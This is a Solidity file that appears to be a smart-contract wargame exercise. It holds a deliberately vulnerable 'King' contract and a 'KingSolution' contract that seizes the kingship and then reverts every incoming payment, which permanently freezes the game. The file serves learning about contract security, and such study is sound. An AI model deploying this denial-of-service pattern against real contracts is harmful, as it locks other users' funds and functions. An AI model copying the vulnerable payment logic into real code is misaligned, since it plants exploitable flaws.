// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}

contract KingSolution {
    constructor(address _challengeAddress) public payable {
        (bool res,) = payable(_challengeAddress).call{value: msg.value}("");
        require(res, "donation failed");
        
        King challenge = King(payable(_challengeAddress));
        require(challenge._king() == address(this), "claim failed");
    }

    receive() external payable {
        revert("Not giving up");
    }
}